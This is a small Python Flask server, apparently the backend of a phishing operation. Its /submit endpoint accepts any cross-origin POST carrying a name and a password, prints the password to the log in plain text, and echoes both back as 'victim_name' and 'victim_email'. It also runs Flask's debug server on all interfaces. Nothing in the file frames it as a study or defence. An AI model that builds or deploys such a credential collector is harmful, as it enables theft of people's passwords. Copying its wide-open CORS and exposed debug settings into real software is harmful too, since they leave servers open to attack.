from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=["*"])  # Temporarily allow all origins for testing

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.get_json()  # Get JSON data sent in POST request
        if not data:
            return jsonify({"error": "No JSON data received"}), 400

        name = data.get('name', 'No name')
        password = data.get('password', 'No password')

        print(f'Name: {name}, password: {password}')

        # Return the response with victim name and email
        return jsonify({'victim_name': name, 'victim_email': password})

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": "Internal Server Error"}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
